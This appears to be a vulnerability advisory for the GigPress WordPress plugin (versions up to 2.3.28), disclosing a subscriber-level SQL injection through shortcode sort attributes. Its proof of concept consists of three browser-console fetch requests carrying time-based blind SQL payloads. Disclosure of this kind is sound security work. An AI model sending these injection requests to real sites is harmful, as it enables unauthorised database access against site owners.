## WordPress Plugin Vulnerabilities

# GigPress <= 2.3.28 - Subscriber+ SQLi

### Description

The plugin does not validate and escape some of its shortcode attributes before using them in SQL statement/s, which could allow any authenticated users, such as subscriber to perform SQL Injection attacks

### Proof of Concept

Run the below commands in the developer console of the web browser while being on the blog as a subscriber user and note the delayed responses
Via gigpress\_menu shortcode, 5s delay
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[gigpress\_menu sort=' AND (SELECT 42 FROM (SELECT(SLEEP(5)))b)']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
Via gigpress\_shows shortcode, 3s delay
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[gigpress\_shows group\_artists='no' sort=' AND (SELECT 42 FROM (SELECT(SLEEP(1)))b)']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
Via gigpress\_related\_shows shortcode, 6s delay:
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&post\_ID=1&shortcode=[gigpress\_related\_shows sort=' AND (SELECT 42 FROM (SELECT(SLEEP(2)))b)']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
